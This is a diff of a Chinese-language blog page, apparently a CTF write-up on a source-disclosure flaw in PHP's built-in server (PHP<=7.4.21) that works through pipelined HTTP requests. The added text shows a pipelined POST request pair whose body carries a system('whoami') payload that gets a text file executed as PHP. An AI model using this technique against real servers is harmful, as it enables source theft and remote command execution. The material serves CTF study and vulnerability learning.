@@ -274,7 +274,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">489字</span>
+        <span class="post-count">612字</span>
       </span>
     </span>
 
@@ -283,7 +283,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
     
@@ -299,7 +299,7 @@
     
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打NEEPU Sec 2023时遇到了一题从php版本切入获取源码的题目，搜了一下发现是一个php&lt;&#x3D;7.4.21版本的源码泄露漏洞</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">国内相关博客链接</a></p>
+<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060/article/details/129350280</a></p>
 <span id="more"></span>
 
 <h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>PHP&lt;&#x3D;7.4.21</p>
@@ -329,7 +329,17 @@
 <p>此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为 PHP 文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是  <code>.php</code> 或  <code>.PHP</code>，或者如果扩展名的长度不等于 3，则该文件被视为静态文件</p>
 </blockquote>
 <p>因此如果我们把第二个GET请求的内容改为类似<code>1.txt</code>的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</p>
+<p>同样的，如果第一个请求是一个静态文件如 <code>1.txt</code>，而第二个请求为 <code>1.php</code> 时，将会以 php 的形式解析 1.txt</p>
+<p>注意，如果要以 POST 请求访问，则是在第二个请求中传入 POST 请求必要的正确请求头（Content-Type，Content-Length 需自行计算）再传入 POST 参数，如：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/1.txt</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:2080</span></span>
 
+
+<span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/1.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">19</span></span>
+
+a=system('whoami');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
     </div>
     
     
